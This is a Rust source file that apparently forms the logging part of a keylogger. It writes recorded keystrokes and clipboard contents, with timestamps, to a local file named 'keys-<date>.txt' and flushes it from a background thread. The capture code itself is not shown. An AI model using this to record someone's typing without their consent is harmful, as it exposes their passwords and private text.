use std::cell::RefCell;
use std::fs::File;
use std::io::{BufWriter, Write};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::thread;
use std::time::Duration;

use chrono::{DateTime, Local, Utc};
use lazy_static::lazy_static;

lazy_static! {
    static ref APPEND_TIMESTAMP_AFTER: chrono::Duration = chrono::Duration::seconds(5);
    static ref PATH: PathBuf = PathBuf::from(format!("keys-{}.txt", Utc::now().format("%Y-%m-%d-%H-%M-%S")));
    static ref FILE_WRITER: Mutex<RefCell<Writer>> = Mutex::new(RefCell::new(Writer::new(BufWriter::new(
        File::create(PATH.as_path()).expect(&format!("Unable to create/open file '{}'", PATH.to_string_lossy())
    )))));
    static ref LAST_APPEND_AT: Mutex<Option<DateTime<Local>>> = Mutex::new(None);
    static ref NEED_FLUSH: AtomicBool = AtomicBool::new(false);
    static ref FORCE_NEW_LINE: AtomicBool = AtomicBool::new(false);
}

pub fn start_file_flush_task() {
    thread::spawn(|| {
        loop {
            thread::sleep(Duration::from_millis(500));
            if NEED_FLUSH.swap(false, Ordering::Relaxed) {
                with_writer(|writer| writer.writer.flush().unwrap_or(()));
            }
        }
    });
}

pub fn save_key(key: &str) {
    append_to_file(key, None);
}

pub fn save_clipboard(content: &str) {
    append_to_file(&format!("\n{}", content), Some(true));
}

fn append_to_file(content: &str, force_new_line: Option<bool>) {
    with_writer(|writer| {
        handle_time_marker(writer);
        writer.append_text(content);
        if let Some(force_new_line) = force_new_line {
            FORCE_NEW_LINE.store(force_new_line, Ordering::Relaxed);
        }
        NEED_FLUSH.store(true, Ordering::Relaxed);
    });
}

fn handle_time_marker(writer: &mut Writer) {
    let now = Local::now();
    let mut last_append_at = LAST_APPEND_AT.lock().expect("Could not acquire last append at lock");
    let interval = last_append_at.map(|i| now.signed_duration_since(i))
        .unwrap_or(chrono::Duration::max_value());

    if interval > *APPEND_TIMESTAMP_AFTER {
        let utc_now = Local::now();
        let mut message = format!("[{}", utc_now.format("%Y-%m-%d %H:%M:%S"));
        if interval < chrono::Duration::max_value() {
            message.push_str(&format!(" ({}s)", interval.num_seconds()));
            FORCE_NEW_LINE.store(true, Ordering::Relaxed);
        }
        message.push_str("] ");
        writer.append_text(&message);
    }
    *last_append_at = Some(now);
}

fn with_writer<F>(f: F) where F: FnOnce(&mut Writer) {
    let writer = FILE_WRITER.lock().expect("Could not acquire file lock");
    let mut writer = writer.borrow_mut();
    f(&mut *writer);
}

struct Writer {
    writer: BufWriter<File>
}

impl Writer {
    pub fn new(writer: BufWriter<File>) -> Self {
        Writer { writer }
    }

    pub fn append_text<'a>(&mut self, text: &str) {
        self.append_bytes(text.as_bytes())
    }

    pub fn append_bytes<'a>(&mut self, text: impl Into<&'a [u8]>) {
        self.write_new_line_if_needed();
        self.writer.write(text.into()).expect(&format!("Could not write data to file '{}'", PATH.to_string_lossy()));
    }

    fn write_new_line_if_needed(&mut self) {
        if FORCE_NEW_LINE.swap(false, Ordering::Relaxed) {
            self.writer.write("\n".as_bytes()).expect(&format!("Could not write new line to to file '{}'", PATH.to_string_lossy()));
        }
    }
}